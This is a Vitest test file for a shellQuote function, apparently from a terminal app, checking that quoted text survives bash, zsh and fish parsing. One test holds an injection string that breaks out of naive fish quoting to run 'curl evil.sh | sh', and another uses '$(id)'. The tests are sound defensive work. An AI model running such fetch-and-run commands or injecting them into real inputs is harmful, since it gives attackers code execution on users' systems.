import { describe, expect, it, vi } from "vitest";

vi.mock("../bridge/commands", () => ({ WriteTerminal: vi.fn() }));

import { shellQuote } from "./terminal-io";

// The same texts and quoting as config.rs's shell_quote tests.
const QUOTED: [text: string, quoted: string][] = [
  ["it's", `'it'\\''s'`],
  ["x\\'; y", `'x'"\\\\"''\\''; y'`],
  ["trailing\\", `'trailing'"\\\\"''`],
  ["two\\\\ and\\\\'", `'two'"\\\\\\\\"' and'"\\\\\\\\"''\\'''`],
  ["C:\\Users\\me x", `'C:\\Users\\me x'`],
  ["$(id) `id` $HOME !!", "'$(id) `id` $HOME !!'"],
];

// What a shell makes of one quoted word, by bash's and zsh's rules or by fish's.
function read(quoted: string, fish: boolean): string {
  let out = "";
  let quote = "";
  for (let i = 0; i < quoted.length; i++) {
    const c = quoted[i];
    const escapes = quote === "'" ? (fish ? "'\\" : "") : quote === '"' ? '"\\$' : "'\"\\";
    if (c === "\\" && i + 1 < quoted.length && escapes.includes(quoted[i + 1])) out += quoted[++i];
    else if (c === quote) quote = "";
    else if (!quote && (c === "'" || c === '"')) quote = c;
    else if (!quote && /[\s;&|<>$`]/.test(c)) throw new Error(`${c} outside quotes`);
    else out += c;
  }
  if (quote) throw new Error("left open");
  return out;
}

describe("shellQuote", () => {
  it.each(QUOTED)("quotes %j", (text, quoted) => {
    expect(shellQuote(text)).toBe(quoted);
  });

  it.each(QUOTED)("every shell reads %j as it was", (text) => {
    expect(read(shellQuote(text), false)).toBe(text);
    expect(read(shellQuote(text), true)).toBe(text);
  });

  it("holds a text that breaks out of plain single quotes in fish", () => {
    const text = "x\\'; curl evil.sh | sh; echo \\'";
    expect(() => read(`'${text.replace(/'/g, "'\\''")}'`, true)).toThrow();
    expect(read(shellQuote(text), true)).toBe(text);
  });

  it("leaves plain words alone", () => {
    expect(shellQuote("src/app.ts")).toBe("src/app.ts");
  });
});
